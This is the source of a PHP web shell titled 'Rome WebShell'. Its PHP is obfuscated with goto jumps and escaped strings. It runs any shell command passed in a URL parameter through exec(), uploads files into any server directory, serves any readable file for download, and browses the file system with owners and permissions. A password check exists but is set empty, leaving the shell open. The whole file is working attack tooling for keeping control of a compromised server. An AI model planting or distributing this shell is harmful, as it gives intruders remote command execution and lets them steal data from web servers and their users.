<?php
 goto pxQoL; jETvw: if (isset($_GET["\x64\x6f\167\156\x6c\157\x61\144"])) { $file = $_GET["\x64\x6f\x77\x6e\x6c\157\141\144"]; if (file_exists($file)) { if (is_readable($file)) { header("\103\x6f\156\164\x65\x6e\x74\x2d\104\x65\163\143\x72\x69\x70\164\151\x6f\x6e\x3a\40\x46\x69\x6c\145\40\124\162\x61\x6e\163\x66\x65\x72"); header("\103\157\x6e\x74\x65\156\164\55\124\x79\x70\145\72\x20\141\x70\160\154\x69\x63\x61\x74\x69\157\156\x2f\157\x63\164\x65\164\55\163\164\162\x65\x61\x6d"); header("\103\157\156\x74\145\156\x74\x2d\x44\x69\x73\160\157\x73\151\164\x69\157\x6e\x3a\40\x61\164\x74\x61\x63\x68\x6d\145\156\x74\73\40\146\151\154\145\156\141\x6d\145\75\x22" . basename($file) . "\x22"); header("\x45\170\160\x69\162\x65\x73\72\x20\60"); header("\103\141\143\150\145\55\103\157\x6e\164\162\x6f\x6c\72\40\x6d\x75\x73\164\x2d\x72\145\x76\x61\154\x69\x64\141\164\145"); header("\120\x72\x61\147\155\x61\72\40\160\x75\x62\x6c\151\x63"); header("\x43\x6f\x6e\164\145\x6e\x74\x2d\x4c\145\156\x67\164\150\x3a\40" . filesize($file)); readfile($file); die; } else { echo "\74\x73\143\x72\x69\160\x74\x3e\141\x6c\145\x72\x74\50\47\x45\x72\x72\157\x72\x3a\x20\x43\157\x75\154\144\40\156\x6f\x74\x20\162\145\141\144\x20\x74\x68\x65\x20\x66\151\x6c\x65\40\x21\x27\51\x3c\x2f\163\x63\162\x69\x70\x74\x3e"; die; } } } goto BJIOa; eJlJ5: if (isset($_POST["\165\160\x6c\x6f\141\x64"])) { $desinationDir = getDir(); $destinationFile = $desinationDir . "\x2f" . basename($_FILES["\146\151\x6c\x65"]["\156\x61\x6d\145"]); if (file_exists($destinationFile)) { echo "\x3c\163\143\x72\x69\x70\164\76\141\154\x65\162\x74\50\47\105\162\x72\157\162\72\40\x46\x69\154\145\40\x61\154\x72\145\141\x64\171\x20\x65\170\151\163\x74\163\x20\x21\x27\x29\x3c\57\x73\143\x72\x69\x70\x74\x3e"; } else { if (move_uploaded_file($_FILES["\x66\x69\x6c\145"]["\x74\x6d\160\137\x6e\141\155\145"], $destinationFile)) { echo "\74\x73\x63\x72\151\160\x74\76\x61\154\x65\162\164\x28\x27\x46\x69\x6c\145\40\x75\160\x6c\157\x61\144\145\144\x20\163\165\x63\x63\x65\163\x73\x66\165\154\171\x20\x21\47\x29\x3c\57\x73\x63\x72\151\x70\164\76"; } else { echo "\74\x73\x63\x72\x69\x70\164\x3e\141\x6c\145\162\164\50\x27\x45\162\162\157\162\72\x20\103\x6f\x75\x6c\144\40\x6e\157\x74\40\x75\x70\x6c\157\x61\x64\40\146\151\x6c\145\x20\x21\47\x29\74\x2f\x73\143\x72\151\160\164\76"; } } } goto jETvw; Q3jyP: echo getDir(); goto xHi8e; aYACX: ?>
';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }</script><script>const popupHTML = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php  goto BKXtN; mxcZb: ?>
</p></div><form action="<?php  goto DxXeD; EEeWh: ?>
"id="command-input"><input name="cmd"> <input name="dir"type="hidden"value="<?php  goto gb_4e; Atw71: if ($pass != null) { if (isset($_COOKIE["\x70\141\163\163"])) { if (md5($_COOKIE["\160\x61\163\163"]) !== $pass) { echo "\127\162\157\156\x67\40\x70\x61\163\x73\167\157\x72\144\x20\41"; die; } } else { echo "\x57\x72\157\156\147\40\x70\141\x73\x73\167\x6f\x72\144\40\41"; die; } } goto eJlJ5; bnGnR: function getCmdResults() { global $cmdresults; global $retval; if ($retval == 0) { foreach ($cmdresults as $line) { echo "{$line}\x20\12\74\x62\x72\x3e"; } } else { echo "\105\x78\145\x63\165\x74\x69\x6f\x6e\x20\x66\x61\151\x6c\145\144\x20\x77\151\164\150\x20\x65\162\162\157\162\x20\143\157\144\x65\72\40" . $retval; } } goto rAuWJ; pxQoL: $pass = ''; goto Atw71; Rqq5O: ?>
</p><p><?php  goto RVIqm; yyTxt: function makeFileName($file) { if (is_dir(getDir() . "\x2f" . $file)) { return "\x3c\x61\x20\x68\162\145\146\75\x22" . $_SERVER["\x50\x48\120\137\x53\x45\x4c\x46"] . "\77\x64\x69\162\x3d" . realpath(getDir() . "\x2f" . $file) . "\42\76" . $file . "\x3c\57\x61\x3e"; } else { return "\74\141\x20\150\162\145\x66\x3d\x22" . $_SERVER["\120\x48\x50\137\x53\105\x4c\106"] . "\77\144\157\x77\156\x6c\157\141\144\75" . realpath(getDir() . "\x2f" . $file) . "\x22\76" . $file . "\x3c\57\141\76"; } } goto jhfTd; QumvP: function formatSizeUnits($bytes) { if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . "\40\107\102"; } elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . "\x20\x4d\102"; } elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . "\x20\113\102"; } elseif ($bytes > 1) { $bytes = $bytes . "\x20\x62\x79\x74\x65\x73"; } elseif ($bytes == 1) { $bytes = $bytes . "\40\x62\x79\164\x65"; } else { $bytes = "\x30\x20\142\x79\x74\145\x73"; } return $bytes; } goto n8fri; OueNt: getFiles(); goto sNQaE; BJIOa: function printPerms($file) { $mode = fileperms($file); if ($mode & 4096) { $type = "\160"; } else { if ($mode & 8192) { $type = "\143"; } else { if ($mode & 16384) { $type = "\144"; } else { if ($mode & 24576) { $type = "\142"; } else { if ($mode & 32768) { $type = "\x2d"; } else { if ($mode & 40960) { $type = "\x6c"; } else { if ($mode & 49152) { $type = "\x73"; } else { $type = "\165"; } } } } } } } $owner["\x72\145\141\144"] = $mode & 256 ? "\x72" : "\x2d"; $owner["\167\x72\151\164\145"] = $mode & 128 ? "\x77" : "\x2d"; $owner["\x65\170\x65\x63\165\164\145"] = $mode & 64 ? "\170" : "\55"; $group["\x72\145\141\x64"] = $mode & 32 ? "\162" : "\x2d"; $group["\x77\x72\151\x74\145"] = $mode & 16 ? "\x77" : "\x2d"; $group["\145\170\x65\x63\165\x74\x65"] = $mode & 8 ? "\170" : "\55"; $world["\162\x65\141\x64"] = $mode & 4 ? "\x72" : "\55"; $world["\x77\x72\151\x74\145"] = $mode & 2 ? "\167" : "\55"; $world["\145\x78\145\143\165\x74\145"] = $mode & 1 ? "\x78" : "\55"; if ($mode & 2048) { $owner["\x65\x78\x65\x63\165\164\145"] = $owner["\145\170\x65\143\165\164\x65"] == "\x78" ? "\x73" : "\x53"; } if ($mode & 1024) { $group["\145\170\145\143\x75\x74\145"] = $group["\145\170\145\143\x75\164\145"] == "\170" ? "\163" : "\123"; } if ($mode & 512) { $world["\x65\x78\x65\143\x75\164\x65"] = $world["\145\170\x65\x63\x75\x74\145"] == "\170" ? "\164" : "\124"; } $s = sprintf("\45\x31\163", $type); $s .= sprintf("\x25\61\x73\45\61\163\x25\x31\x73", $owner["\162\145\141\144"], $owner["\167\162\151\x74\x65"], $owner["\x65\x78\x65\x63\165\164\145"]); $s .= sprintf("\45\61\x73\x25\61\163\x25\x31\163", $group["\x72\x65\x61\144"], $group["\x77\162\x69\x74\x65"], $group["\x65\170\x65\143\165\x74\x65"]); $s .= sprintf("\45\x31\163\x25\61\163\45\x31\163", $world["\x72\x65\141\144"], $world["\167\x72\x69\164\x65"], $world["\145\170\145\x63\165\164\x65"]); return $s; } goto QumvP; khpu6: ?>
<!doctypehtml><html><head><meta charset="utf-8"><title>Rome WebShell</title><script>function changeDir() {
                const url = '<?php  goto R4Iey; gb_4e: echo getDir(); goto f9jOW; n8fri: function getDir() { return isset($_GET["\144\151\x72"]) ? realpath($_GET["\x64\x69\x72"]) : getcwd(); } goto yyTxt; rAuWJ: function getCommandLine() { $hostname = gethostname() ?? "\156\x6f\x6e\145"; $username = posix_getpwuid(posix_geteuid())["\x6e\x61\155\x65"]; $dir = getDir(); $cmd = isset($_GET["\x63\x6d\x64"]) ? $_GET["\x63\155\144"] : "\x4e\x6f\x20\x63\x6f\155\x6d\141\156\144"; return "\74\163\160\141\x6e\x20\x73\x74\x79\154\145\x3d\42\x63\157\154\157\x72\x3a\40\x23\x31\x39\x63\x34\x32\141\x22\76" . $username . "\x40" . $hostname . "\74\57\163\x70\141\156\x3e\72\40\74\163\x70\141\x6e\x20\163\164\171\x6c\x65\x3d\x22\x63\157\x6c\157\162\72\x20\43\60\x66\x37\x35\62\x31\x22\x3e" . $dir . "\x3c\57\163\160\141\x6e\x3e\44\x20" . $cmd; } goto h6_vX; BKXtN: echo $_SERVER["\x50\x48\120\137\x53\105\x4c\x46"] . "\x3f\144\x69\x72\x3d" . getDir(); goto ewPpp; RVIqm: getCmdResults(); goto mxcZb; DxXeD: echo $_SERVER["\x50\x48\x50\x5f\123\105\x4c\x46"]; goto EEeWh; jhfTd: function getFiles() { $files = scandir(getDir()); $even = true; if ($files != null) { foreach ($files as $filename) { echo "\74\x74\162\40\163\164\x79\x6c\x65\75\x22\x62\x61\143\153\147\x72\x6f\165\156\x64\x2d\143\157\x6c\157\162\72" . ($even ? "\43\65\61\65\x31\65\61" : "\x23\64\61\64\x31\64\x31") . "\x3b\42\76"; echo "\x3c\164\x64\40\163\164\x79\x6c\x65\75\42\x66\157\156\164\x2d\167\x65\151\147\x68\x74\72" . (is_dir(getDir() . "\x2f" . $filename) ? "\142\x6f\154\x64" : "\164\150\151\x6e") . "\x3b\x22\x3e" . makeFileName($filename) . "\74\57\164\144\x3e"; echo "\74\164\144\76" . posix_getpwuid(fileowner(getDir() . "\x2f" . $filename))["\156\141\x6d\145"] . "\74\57\x74\x64\76"; echo "\74\164\144\x3e" . printPerms(getDir() . "\x2f" . $filename) . "\74\57\x74\144\76"; echo "\x3c\164\x64\x3e" . formatSizeUnits(filesize(getDir() . "\x2f" . $filename)) . "\74\57\164\144\76"; echo "\x3c\x2f\x74\x72\x3e"; $even = !$even; } } else { echo "\x3c\x70\76\x43\x6f\x75\x6c\144\x6e\47\164\x20\157\x70\145\x6e\x20\164\x68\141\164\40\x64\x69\x72\x65\143\164\157\x72\x79\40\x21"; } } goto bnGnR; Go8W3: echo getCommandLine(); goto Rqq5O; sNQaE: ?>
</table></div><div class="command-panel"><div class="command-output"><p><?php  goto Go8W3; jmoiy: $retval = null; goto pmoTS; pmoTS: if (isset($_GET["\143\155\144"])) { exec("\x63\144\40" . realpath(getDir()) . "\x20\x26\46\x20" . $_GET["\x63\155\144"], $cmdresults, $retval); } goto khpu6; h6_vX: $cmdresults; goto jmoiy; ewPpp: ?>
" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function showPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHTML + bodyHTML;
            }

            function hidePopup() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }</script></head><body class="body-container"><header><nav><h1>> Rome Shell</h1><div class="nav-items"><a onclick="showPopup()">Upload file</a> <a onclick="changeDir()">Change Directory</a></div></nav></header><div class="content-container"><div class="explorer-panel"><h4>Exploring:<?php  goto Q3jyP; xHi8e: ?>
</h4><table><tr style="background-color:#292929"><th>Folder / <span style="font-weight:lighter">File</span></th><th>Owner</th><th>Permissions</th><th>Size</th></tr><?php  goto OueNt; R4Iey: echo $_SERVER["\x50\110\120\137\x53\x45\114\106"] . "\77\144\x69\x72\x3d"; goto aYACX; f9jOW: ?>
"> <button action="submit"><p>Send</p></button></form></div></div><style>:root{--background-color-1:#101010;--background-color-2:#202020;--background-color-3:#303030;--background-color-4:#404040;--primary-color:#0e9c15;--secondary-color:#0f7521}body,html{width:100%;height:100%;margin:0;padding:0;background-color:var(--background-color-2)}.body-container{display:grid;grid-template-rows:50px calc(100% - 50px)}header{z-index:1;background-color:var(--primary-color);box-shadow:0 2px 6px #000}header nav{height:100%;display:flex;justify-content:flex-start;color:#fff;font-family:Arial,Helvetica,sans-serif}header h1{height:100%;margin:0;margin-left:20px;text-align:center;line-height:50px;font-size:40px}header .nav-items{height:100%;width:auto;margin:0;display:flex;flex-grow:1;justify-content:flex-end}header .nav-items a{height:100%;margin-right:30px;color:#fff;font-size:25px;text-decoration:none;line-height:50px;text-align:center;transition:ease-in .2s}header .nav-items a:hover{color:#d0d0d0;cursor:pointer}.content-container{height:100%;position:relative;display:grid;grid-template-columns:30% 70%}.explorer-panel{background-color:var(--background-color-3);font-family:'Trebuchet MS','Lucida Sans Unicode','Lucida Grande','Lucida Sans',Arial,sans-serif;overflow-y:scroll;scrollbar-color:var(--background-color-4) var(--background-color-3);scrollbar-width:thin;box-shadow:0 0 4px #000;padding:3px}.explorer-panel h4{margin:10px;font-size:20px}.explorer-panel table{width:100%;word-wrap:break-word;border-spacing:2px;table-layout:fixed;background-color:var(--background-color-2)}.explorer-panel table td{padding:1px 2px}.explorer-panel table a{color:var(--primary-color);text-decoration:none}.explorer-panel table a:hover{color:var(--secondary-color);transition:ease .2s}.command-panel{margin:20px;padding:15px;border-radius:5px;background-color:var(--background-color-3);display:grid;grid-template-rows:93% calc(7% - 15px);row-gap:15px;box-shadow:0 0 6px #000}.command-output{padding:5px;border-radius:5px;background-color:var(--background-color-1);overflow-y:scroll;scrollbar-color:var(--background-color-4) var(--background-color-3);scrollbar-width:thin}.command-output p{margin:0;font-family:'Gill Sans','Gill Sans MT',Calibri,'Trebuchet MS',sans-serif}#command-input{display:grid;grid-template-columns:89% 10%;grid-template-rows:100%;column-gap:1%}#command-input input{height:100%;width:100%;border-radius:5px;border:none;background-color:var(--background-color-2);color:#fff;font-size:200%}#command-input button{height:100%;width:100%;border:none;border-radius:5px;background-color:var(--background-color-4);cursor:pointer}#command-input button:hover{background-color:var(--primary-color);transition:ease-in-out .3s}#command-input button p{margin:0;color:#fff;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;font-size:150%;font-weight:bolder;line-height:100%}.popup-container{z-index:5;position:fixed;background-color:rgba(10,10,10,.6);width:100%;height:100%;display:grid;justify-content:center;align-content:center;grid-template-columns:30%;grid-template-rows:35%}.popup{background-color:var(--background-color-3);border-radius:5px;box-shadow:0 2px 6px #000;display:grid;grid-template-rows:20% 70%;row-gap:10%;padding:2.5%}.popup h4{text-align:center;font-family:'Courier New',Courier,monospace;font-size:23px}.popup form{display:grid;grid-template-rows:80% 20%;grid-template-columns:95%;justify-content:center;align-content:center}.popup-buttons{height:100%;display:inline-flex;flex-wrap:wrap;gap:10%}.popup-buttons button{width:45%;background-color:var(--background-color-4);border-radius:4px;border:none;font-size:22px;color:#fff;transition:ease-in .2s}.popup-buttons button:hover{background-color:var(--background-color-2);cursor:pointer}.popup-buttons input{width:45%;background-color:var(--primary-color);border-radius:4px;border:none;font-size:22px;color:#fff;transition:ease-in .2s}.popup-buttons input:hover{background-color:var(--secondary-color);cursor:pointer}</style></body></html>